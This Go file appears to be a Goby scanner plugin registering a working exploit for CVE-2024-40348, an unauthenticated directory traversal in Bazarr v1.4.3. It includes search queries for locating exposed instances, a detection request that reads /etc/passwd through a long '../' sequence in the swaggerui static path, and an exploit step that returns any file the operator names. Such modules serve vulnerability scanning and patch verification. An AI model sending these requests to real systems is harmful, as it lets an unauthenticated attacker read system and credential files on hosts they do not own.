package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Bazarr static File Read Vulnerability (CVE-2024-40348)",
    "Description": "<p>Bazarr is a companion application to Sonarr and Radarr that manages and downloads subtitles based on your requirements.A vulnerability in the -api-swaggerui-static component in Bazaar v1.4.3 could allow an unauthenticated attacker to perform directory traversal operations.</p>",
    "Product": "bazarr",
    "Homepage": "https://www.bazarr.media",
    "DisclosureDate": "2024-07-20",
    "PostTime": "2024-07-24",
    "Author": "wufangjun@baimaohui.net",
    "FofaQuery": "title=\"Bazarr\" && header=\"http\"",
    "GobyQuery": "title=\"Bazarr\" && header=\"http\"",
    "Level": "1",
    "Impact": "<p>An unauthenticated attacker can exploit this vulnerability to perform directory traversal operations, such as reading sensitive files such as passwd and zshrc in the -etc directory. The attacker can use the read information to further launch attacks.</p>",
    "Recommendation": "<p>It is recommended that you update your current system or software to the latest version to fix the vulnerability.</p>",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-99863"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}//api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/swaggerui/static/../../../../../../../../../../../../../../../..{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-40348"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Bazarr static 文件读取漏洞（CVE-2024-40348）",
            "Product": "bazarr",
            "Description": "<p>Bazarr 是 Sonarr 和 Radarr 的配套应用程序，可以根据您的要求管理和下载字幕。Bazaar v1.4.3中的static组件存在一个漏洞，未经验证的攻击者可以利用该漏洞执行目录遍历操作。<br></p>",
            "Recommendation": "<p>建议您更新当前系统或软件至最新版，完成漏洞的修复。<br></p>",
            "Impact": "<p>未经验证的攻击者可以利用该漏洞执行目录遍历操作，例如读取/etc目录下面的passwd、zshrc等敏感文件，攻击者可利用读取到的信息进一步发起攻击。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Bazarr static File Read Vulnerability (CVE-2024-40348)",
            "Product": "bazarr",
            "Description": "<p>Bazarr is a companion application to Sonarr and Radarr that manages and downloads subtitles based on your requirements.A vulnerability in the -api-swaggerui-static component in Bazaar v1.4.3 could allow an unauthenticated attacker to perform directory traversal operations.<br></p>",
            "Recommendation": "<p>It is recommended that you update your current system or software to the latest version to fix the vulnerability.<br></p>",
            "Impact": "<p>An unauthenticated attacker can exploit this vulnerability to perform directory traversal operations, such as reading sensitive files such as passwd and zshrc in the -etc directory. The attacker can use the read information to further launch attacks.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}